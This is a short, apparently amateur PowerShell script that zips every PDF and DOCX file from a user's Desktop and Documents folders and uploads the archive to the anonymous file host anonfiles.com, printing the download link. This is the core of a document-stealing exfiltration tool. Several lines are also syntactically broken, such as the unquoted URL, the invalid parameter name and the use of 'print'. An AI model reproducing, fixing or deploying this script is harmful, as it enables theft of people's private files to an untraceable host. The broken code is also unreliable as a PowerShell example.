#the following is a idea a got while sitting in a cafe. at the end it should upload a file to anonfiles.com and echo the url to access it.
$datapath1 = "%temp%\testforapi\test.zip"
$input1 = "%User%\Desktop\*.pdf,*.docx"
$input2 = "%User%\Dokuments\*.pdf,*.docx"
Compress-Archive $input1 $datapath1
Compress-Archive $input2 -update $datapath1

$url = https://api.anonfiles.com/upload?token="your Anonfiles api token"

$r = Invoke-WebRequest -url $url -Method Put -Infile $datapath1

print "$r.Content"